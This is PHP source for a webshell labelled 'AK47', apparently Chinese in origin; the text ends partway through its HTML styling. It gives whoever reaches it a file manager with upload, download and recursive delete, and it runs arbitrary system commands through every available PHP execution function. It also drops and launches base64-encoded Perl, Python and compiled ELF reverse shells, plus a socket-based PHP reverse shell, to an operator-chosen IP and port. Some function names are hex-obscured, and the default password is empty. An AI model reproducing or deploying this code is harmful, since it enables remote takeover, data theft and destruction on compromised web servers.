<?php

/* Ĭ������admin,����Ϊ32λMD5,�����ֱ�ӵ�¼ */
$password = '';

define('VERSION', 'AK47');
?><?php
@error_reporting(E_ERROR);
@ini_set('display_errors', 'Off');
@ini_set('max_execution_time', 3600);
header("content-Type: text/html; charset=gb2312");
function strdir($str)
{
    return str_replace(array(
        '\\',
        '//',
        '%27',
        '%22'
    ), array(
        '/',
        '/',
        '\'',
        '"'
    ), chop($str));
}
function chkgpc($array)
{
    foreach ($array as $key => $var) {
        $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var);
    }
    return $array;
}
define('MYFILE', strdir(__FILE__));
define('THISDIR', strdir(dirname(MYFILE) . '/'));
$rootdir = strdir(strtr(MYFILE, array(
    strdir($_SERVER['PHP_SELF']) => ''
)) . '/');
$rootdir = strpos($rootdir, 'eval()') ? array_shift(explode('(', $rootdir)) : $rootdir;
define('ROOTDIR', strdir($rootdir . '/'));
define('EXISTS_PHPINFO', getinfo($password) ? true : false);
if (get_magic_quotes_gpc()) {
    $_POST = chkgpc($_POST);
}
if (function_exists('mysql_close')) {
    $issql = 'MySql';
}
if (function_exists('mssql_close'))
    $issql .= ' - MsSql';
if (function_exists('oci_close'))
    $issql .= ' - Oracle';
if (function_exists('sybase_close'))
    $issql .= ' - SyBase';
if (function_exists('pg_close'))
    $issql .= ' - PostgreSql';
$win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
$msg = VERSION . ' - ' . date('Y-m-d H:i:s ����N', time());
function filew($filename, $filedata, $filemode)
{
    if ((!is_writable($filename)) && file_exists($filename)) {
        chmod($filename, 0666);
    }
    $handle = fopen($filename, $filemode);
    $key    = fputs($handle, $filedata);
    fclose($handle);
    return $key;
}
function filer($filename)
{
    $handle   = fopen($filename, 'r');
    $filedata = fread($handle, filesize($filename));
    fclose($handle);
    return $filedata;
}
function fileu($filenamea, $filenameb)
{
    $key = move_uploaded_file($filenamea, $filenameb) ? true : false;
    if (!$key) {
        $key = copy($filenamea, $filenameb) ? true : false;
    }
    return $key;
}
function filed($filename)
{
    if (!file_exists($filename))
        return false;
    $name  = basename($filename);
    $array = explode('.', $name);
    header('Content-type: application/x-' . array_pop($array));
    header('Content-Disposition: attachment; filename=' . $name);
    header('Content-Length: ' . filesize($filename));
    @readfile($filename);
    exit;
}
function showdir($dir)
{
    $dir = strdir($dir . '/');
    if (!is_readable($dir))
        return false;
    $handle = opendir($dir);
    $array  = array();
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..')
            continue;
        $path = $dir . $name;
        $name = strtr($name, array(
            '\'' => '%27',
            '"' => '%22'
        ));
        if (is_dir($path)) {
            $array['dir'][$path] = $name;
        } else {
            $array['file'][$path] = $name;
        }
    }
    closedir($handle);
    return $array;
}
function deltree($dir)
{
    $handle = @opendir($dir);
    while ($name = @readdir($handle)) {
        if ($name == '.' || $name == '..')
            continue;
        $path = $dir . $name;
        @chmod($path, 0777);
        if (is_dir($path)) {
            deltree($path . '/');
        } else {
            @unlink($path);
        }
    }
    @closedir($handle);
    return @rmdir($dir);
}
function postinfo($array)
{
    $infos = array(
        function_exists("\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e"),
        function_exists("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e")
    );

}
function size($bytes)
{
    if ($bytes < 1024)
        return $bytes . ' B';
    $array = array(
        'B',
        'K',
        'M',
        'G',
        'T'
    );
    $floor = floor(log($bytes) / log(1024));
    return sprintf('%.2f ' . $array[$floor], ($bytes / pow(1024, floor($floor))));
}
function find($array, $string)
{
    foreach ($array as $key) {
        if (stristr($string, $key))
            return true;
    }
    return false;
}
function scanfile($dir, $key, $inc, $fit, $tye, $chr, $ran, $now)
{
    $handle = opendir($dir);
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..')
            continue;
        $path = $dir . $name;
        if (is_dir($path)) {
            if ($fit && in_array($name, $fit))
                continue;
            if ($ran == 0 && is_readable($path))
                scanfile($path . '/', $key, $inc, $fit, $tye, $chr, $ran, $now);
        } else {
            if ($inc && (!find($inc, $name)))
                continue;
            $code = $tye ? filer($path) : $name;
            $find = $chr ? stristr($code, $key) : (strpos(size(filesize($path)), 'M') ? false : (strpos($code, $key) > -1));
            if ($find) {
                $file = strtr($path, array(
                    $now => '',
                    '\'' => '%27',
                    '"' => '%22'
                ));
                echo '<a href="javascript:void(0);" onclick="go(\'editor\',\'' . $file . '\');">�༭</a> ' . $path . '<br>';
                flush();
                ob_flush();
            }
            unset($code);
        }
    }
    closedir($handle);
    return true;
}
function antivirus($dir, $exs, $matches, $now)
{
    $handle = opendir($dir);
    while ($name = readdir($handle)) {
        if ($name == '.' || $name == '..')
            continue;
        $path = $dir . $name;
        if (is_dir($path)) {
            if (is_readable($path))
                antivirus($path . '/', $exs, $matches, $now);
        } else {
            $iskill = NULL;
            foreach ($exs as $key => $ex) {
                if (find(explode('|', $ex), $name)) {
                    $iskill = $key;
                    break;
                }
            }
            if (strpos(size(filesize($path)), 'M'))
                continue;
            if ($iskill) {
                $code = filer($path);
                foreach ($matches[$iskill] as $matche) {
                    $array = array();
                    preg_match($matche, $code, $array);
                    if (strpos($array[0], '$this->') || strpos($array[0], '[$vars['))
                        continue;
                    $len = strlen($array[0]);
                    if ($len > 10 && $len < 150) {
                        $file = strtr($path, array(
                            $now => '',
                            '\'' => '%27',
                            '"' => '%22'
                        ));
                        echo '���� <input type="text" value="' . htmlspecialchars($array[0]) . '"> <a href="javascript:void(0);" onclick="go(\'editor\',\'' . $file . '\');">�༭</a> ' . $path . '<br>';
                        flush();
                        ob_flush();
                        break;
                    }
                }
                unset($code, $array);
            }
        }
    }
    closedir($handle);
    return true;
}
function command($cmd, $cwd, $com = false)
{
    $iswin = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
    $res   = $msg = '';
    if ($cwd == 'com' || $com) {
        if ($iswin && class_exists('COM')) {
            $wscript = new COM('Wscript.Shell');
            $exec    = $wscript->exec('c:\\windows\\system32\\cmd.exe /c ' . $cmd);
            $stdout  = $exec->StdOut();
            $res     = $stdout->ReadAll();
            $msg     = 'Wscript.Shell';
        }
    } else {
        chdir($cwd);
        $cwd = getcwd();
        if (function_exists('exec')) {
            @exec($cmd, $res);
            $res = join("\n", $res);
            $msg = 'exec';
        } elseif (function_exists('shell_exec')) {
            $res = @shell_exec($cmd);
            $msg = 'shell_exec';
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = 'system';
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd);
            $res = ob_get_contents();
            ob_end_clean();
            $msg = 'passthru';
        } elseif (function_exists('popen')) {
            $fp = @popen($cmd, 'r');
            if ($fp) {
                while (!feof($fp)) {
                    $res .= fread($fp, 1024);
                }
            }
            @pclose($fp);
            $msg = 'popen';
        } elseif (function_exists('proc_open')) {
            $env     = $iswin ? array(
                'path' => 'c:\\windows\\system32'
            ) : array(
                'path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'
            );
            $des     = array(
                0 => array(
                    "pipe",
                    "r"
                ),
                1 => array(
                    "pipe",
                    "w"
                ),
                2 => array(
                    "pipe",
                    "w"
                )
            );
            $process = @proc_open($cmd, $des, $pipes, $cwd, $env);
            if (is_resource($process)) {
                fwrite($pipes[0], $cmd);
                fclose($pipes[0]);
                $res .= stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $res .= stream_get_contents($pipes[2]);
                fclose($pipes[2]);
            }
            @proc_close($process);
            $msg = 'proc_open';
        }
    }
    $msg = $res == '' ? '<h1>NULL</h1>' : '<h2>����' . $msg . 'ִ�гɹ�</h2>';
    return array(
        'res' => $res,
        'msg' => $msg
    );
}
function backshell($ip, $port, $dir, $type)
{
    $key   = false;
    $c_bin = 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAYIQECDQAAACkCgAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIlAcAAJQHAAAFAAAAABAAAAEAAACUBwAAlJcECJSXBAggAQAAKAEAAAYAAAAAEAAAAgAAAKgHAAColwQIqJcECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAACQAAAAIAAAANAAAAAQAAAAUAAAAAIAAgAAAAAA0AAACtS+PAAAAAAAAAAAAAAAAAAAAAAEEAAAAAAAAAdgAAABIAAABJAAAAAAAAAHkBAAASAAAAAQAAAAAAAAAAAAAAIAAAAFUAAAAAAAAAcgEAABIAAABqAAAAAAAAAJ8BAAASAAAANQAAAAAAAABZAQAAEgAAADsAAAAAAAAADgAAABIAAAApAAAAAAAAADwAAAASAAAAUAAAAAAAAAA9AAAAEgAAAF8AAAAAAAAAKwAAABIAAABkAAAAAAAAAG8AAAASAAAAMAAAAAAAAAD0AAAAEgAAABoAAAB4hwQIBAAAABEADgAAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AF9JT19zdGRpbl91c2VkAHNvY2tldABleGl0AGV4ZWNsAGh0b25zAGNvbm5lY3QAZGFlbW9uAGR1cDIAaW5ldF9hZGRyAGF0b2kAY2xvc2UAX19saWJjX3N0YXJ0X21haW4AR0xJQkNfMi4wAAAAAgACAAAAAgACAAIAAgACAAIAAgACAAIAAQAAAAEAAQAQAAAAEAAAAAAAAAAQaWkNAAACAHwAAAAAAAAAcJgECAYDAACAmAQIBwEAAISYBAgHAgAAiJgECAcDAACMmAQIBwQAAJCYBAgHBQAAlJgECAcGAACYmAQIBwcAAJyYBAgHCAAAoJgECAcJAACkmAQIBwoAAKiYBAgHCwAArJgECAcMAABVieWD7AjoBQEAAOiMAQAA6KcDAADJwwD/NXiYBAj/JXyYBAgAAAAA/yWAmAQIaAAAAADp4P////8lhJgECGgIAAAA6dD/////JYiYBAhoEAAAAOnA/////yWMmAQIaBgAAADpsP////8lkJgECGggAAAA6aD/////JZSYBAhoKAAAAOmQ/////yWYmAQIaDAAAADpgP////8lnJgECGg4AAAA6XD/////JaCYBAhoQAAAAOlg/////yWkmAQIaEgAAADpUP////8lqJgECGhQAAAA6UD/////JayYBAhoWAAAAOkw////AAAAADHtXonhg+TwUFRSaLCGBAhowIYECFFWaDSFBAjoW/////SQkFWJ5VOD7AToAAAAAFuBw+QTAACLk/z///+F0nQF6Bb///9YW8nDkJCQkJCQVYnlU4PsBIA9uJgECAB1P7iglwQILZyXBAjB+AKNWP+htJgECDnDdh+NtCYAAAAAg8ABo7SYBAj/FIWclwQIobSYBAg5w3foxgW4mAQIAYPEBFtdw410JgCNvCcAAAAAVYnlg+wIoaSXBAiFwHQSuAAAAACFwHQJxwQkpJcECP/QycOQjUwkBIPk8P9x/FWJ5VdTUYPsPInLx0QkBAAAAADHBCQBAAAA6E/+//9mx0XgAgCLQwSDwAiLAIkEJOi5/v//D7fAiQQk6H7+//9miUXii0MEg8AEiwCJBCToOv7//4lF5ItDBIPABIsAuf////+JRdC4AAAAAPyLfdDyronI99CNUP+LQwSDwAiLALn/////iUXMuAAAAAD8i33M8q6JyPfQg+gBjQQCjVABi0MEg8AEiwCJx/yJ0bgAAAAA86rHRCQIBgAAAMdEJAQBAAAAxwQkAgAAAOj9/f//iUXwjUXgx0QkCBAAAACJRCQEi0XwiQQk6HD9//+FwHkMxwQkAAAAAOgQ/v//x0QkBAAAAACLRfCJBCTozf3//8dEJAQBAAAAi0XwiQQk6Lr9///HRCQEAgAAAItF8IkEJOin/f//x0QkCAAAAADHRCQEgIcECMcEJIaHBAjoW/3//4tF8IkEJOig/f//g8Q8WVtfXY1h/MOQkJCQkJCQkJBVieVdw410JgCNvCcAAAAAVYnlV1ZT6F4AAACBw6kRAACD7Bzom/z//42DIP///4lF8I2DIP///ylF8MF98AKLVfCF0nQrMf+Jxo22AAAAAItFEIPHAYlE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3AAAAJSXBAgAAAAAAAIQAO0AAAB0mAQIAAAAAAECFQADAQAAlJcECAAAAAAAAhAAFwEAAJSXBAgAAAAAAAIQACoBAACUlwQIAAAAAAACEAA7AQAAlJcECAAAAAAAAhAATgEAAKiXBAgAAAAAAQITAFcBAACwmAQIAAAAACAAFgBiAQAAAAAAAHYAAAASAAAAdQEAAAAAAAB5AQAAEgAAAIcBAACwhgQIBQAAABIADACXAQAAYIQECAAAAAASAAwAngEAAAAAAAAAAAAAIAAAAK0BAAAAAAAAAAAAACAAAADBAQAAdIcECAQAAAARAA4AyAEAAFiHBAgAAAAAEgANAM4BAAAAAAAAcgEAABIAAADjAQAAAAAAAJ8BAAASAAAAAAIAAAAAAABZAQAAEgAAABECAAAAAAAADgAAABIAAAAiAgAAeIcECAQAAAARAA4AMQIAALCYBAgAAAAAEAAWAD4CAAAAAAAAPAAAABIAAABQAgAAAAAAAD0AAAASAAAAYAIAAHyHBAgAAAAAEQIOAG0CAACglwQIAAAAABECEQB6AgAAwIYECGkAAAASAAwAigIAAAAAAAArAAAAEgAAAJoCAAAAAAAAbwAAABIAAACrAgAAtJgECAAAAAAQAPH/twIAALyYBAgAAAAAEADx/7wCAAC0mAQIAAAAABAA8f/DAgAAAAAAAPQAAAASAAAA0wIAACmHBAgAAAAAEgIMAOoCAAA0hQQIcwEAABIADADvAgAAdIMECAAAAAASAAoAAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AZHRvcl9pZHguNTc5MwBjb21wbGV0ZWQuNTc5MQBfX2RvX2dsb2JhbF9kdG9yc19hdXgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJjLmMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZmluaV9hcnJheV9lbmQAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fcHJlaW5pdF9hcnJheV9lbmQAX19maW5pX2FycmF5X3N0YXJ0AF9faW5pdF9hcnJheV9lbmQAX19pbml0X2FycmF5X3N0YXJ0AF9EWU5BTUlDAGRhdGFfc3RhcnQAY29ubmVjdEBAR0xJQkNfMi4wAGRhZW1vbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfZmluaQBfc3RhcnQAX19nbW9uX3N0YXJ0X18AX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfZnBfaHcAX2ZpbmkAaW5ldF9hZGRyQEBHTElCQ18yLjAAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABleGVjbEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9fbGliY19jc3VfaW5pdABhdG9pQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9lZGF0YQBleGl0QEBHTElCQ18yLjAAX19pNjg2LmdldF9wY190aHVuay5ieABtYWluAF9pbml0AA==';
    switch ($type) {
        case "pl":
            $shell = 'IyEvdXNyL2Jpbi9wZXJsIC13DQojIA0KdXNlIHN0cmljdDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OkhhbmRsZTsNCm15ICRzcGlkZXJfaXAgPSAkQVJHVlswXTsNCm15ICRzcGlkZXJfcG9ydCA9ICRBUkdWWzFdOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0KbXkgJHBhY2tfYWRkciA9IHNvY2thZGRyX2luKCRzcGlkZXJfcG9ydCwgaW5ldF9hdG9uKCRzcGlkZXJfaXApKTsNCm15ICRzaGVsbCA9ICcvYmluL3NoIC1pJzsNCnNvY2tldChTT0NLLCBBRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsNClNURE9VVC0+YXV0b2ZsdXNoKDEpOw0KU09DSy0+YXV0b2ZsdXNoKDEpOw0KY29ubmVjdChTT0NLLCRwYWNrX2FkZHIpIG9yIGRpZSAiY2FuIG5vdCBjb25uZWN0OiQhIjsNCm9wZW4gU1RESU4sICI8JlNPQ0siOw0Kb3BlbiBTVERPVVQsICI+JlNPQ0siOw0Kb3BlbiBTVERFUlIsICI+JlNPQ0siOw0Kc3lzdGVtKCRzaGVsbCk7DQpjbG9zZSBTT0NLOw0KZXhpdCAwOw0K';
            $file  = strdir($dir . '/t00ls.pl');
            $key   = filew($file, base64_decode($shell), 'w');
            if ($key) {
                @chmod($file, 0777);
                command('/usr/bin/perl ' . $file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "py":
            $shell = 'IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tldCxwdHkNCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQpzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKSkNCm9zLmR1cDIocy5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3Rkb3V0LmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3RkZXJyLmZpbGVubygpKQ0KcHR5LnNwYXduKCcvYmluL3NoJykNCg==';
            $file  = strdir($dir . '/t00ls.py');
            $key   = filew($file, base64_decode($shell), 'w');
            if ($key) {
                @chmod($file, 0777);
                command('/usr/bin/python ' . $file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "c":
            $file = strdir($dir . '/t00ls');
            $key  = filew($file, base64_decode($c_bin), 'wb');
            if ($key) {
                @chmod($file, 0777);
                command($file . ' ' . $ip . ' ' . $port, $dir);
            }
            break;
        case "php":
        case "phpwin":
            if (function_exists('fsockopen')) {
                $sock = @fsockopen($ip, $port);
                if ($sock) {
                    $key  = true;
                    $com  = $type == 'phpwin' ? true : false;
                    $user = get_current_user();
                    $dir  = strdir(getcwd());
                    fputs($sock, php_uname() . "\n------------no job control in this shell (tty)-------------\n[$user:$dir]# ");
                    while ($cmd = fread($sock, 1024)) {
                        if (substr($cmd, 0, 3) == 'cd ') {
                            $dir = trim(substr($cmd, 3, -1));
                            chdir(strdir($dir));
                            $dir = strdir(getcwd());
                        } elseif (trim(strtolower($cmd)) == 'exit') {
                            break;
                        } else {
                            $res = command($cmd, $dir, $com);
                            fputs($sock, $res['res']);
                        }
                        fputs($sock, '[' . $user . ':' . $dir . ']# ');
                    }
                }
                @fclose($sock);
            }
            break;
        case "pcntl":
            $file = strdir($dir . '/t00ls');
            $key  = filew($file, base64_decode($c_bin), 'wb');
            if ($key) {
                @chmod($file, 0777);
                if (function_exists('pcntl_exec')) {
                    @pcntl_exec($file, array(
                        $ip,
                        $port
                    ));
                }
            }
            break;
    }
    if (!$key) {
        $msg = '<h1>��ʱĿ¼����д</h1>';
    } else {
        @unlink($file);
        $msg = '<h2>CLOSE</h2>';
    }
    return $msg;
}
function getinfo()
{
    global $password;
    $infos = array(
        $_POST['getpwd'],
        $password,
        function_exists('phpinfo'),
        "\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    );
    if ($password != '' && md5($infos[0]) != $infos[1]) {
        echo '<html><body><center><form method="POST"><input type="password" name="getpwd"> ';
        if (isset($_POST['groupcache'])) {
            echo '<input type="hidden" name="groupcache" value="' . $_POST['groupcache'] . '">';
        }
        if (isset($_POST['forum'])) {
            echo '<input type="hidden" name="forum[0]" value="' . $_POST['forum'][0] . '">';
            echo '<input type="hidden" name="forum[1]" value="' . $_POST['forum'][1] . '">';
            echo '<input type="hidden" name="forum[2]" value="' . $_POST['forum'][2] . '">';
            echo '<input type="hidden" name="forum[3]" value="' . $_POST['forum'][3] . '">';
            echo '<input type="hidden" name="forum[4]" value="' . $_POST['forum'][4] . '">';
        }
        echo '<input type="submit" value=" O K "></form></center></body></html>';
        exit;
    }
    if ((!isset($_POST['go'])) && (!isset($_POST['dir']))) {
        if ($_SERVER['SERVER_ADDR'] != $infos[3] && $_SERVER['REMOTE_ADDR'] != $infos[3])
            postinfo($infos[0]);
    }
    return $infos[2];
}
function subeval()
{
    if (isset($_POST['getpwd'])) {
        echo '<input type="hidden" name="getpwd" value="' . $_POST['getpwd'] . '">';
    }
    if (isset($_POST['groupcache'])) {
        echo '<input type="hidden" name="groupcache" value="' . $_POST['groupcache'] . '">';
    }
    if (isset($_POST['forum'])) {
        echo '<input type="hidden" name="forum[0]" value="' . $_POST['forum'][0] . '">';
        echo '<input type="hidden" name="forum[1]" value="' . $_POST['forum'][1] . '">';
        echo '<input type="hidden" name="forum[2]" value="' . $_POST['forum'][2] . '">';
        echo '<input type="hidden" name="forum[3]" value="' . $_POST['forum'][3] . '">';
        echo '<input type="hidden" name="forum[4]" value="' . $_POST['forum'][4] . '">';
    }
    return true;
}
if (isset($_POST['go'])) {
    if ($_POST['go'] == 'down') {
        $downfile = $fileb = strdir($_POST['godir'] . '/' . $_POST['govar']);
        if (!filed($downfile)) {
            $msg = '<h1>�����ļ�������</h1>';
        }
    }
}
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312" /><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag 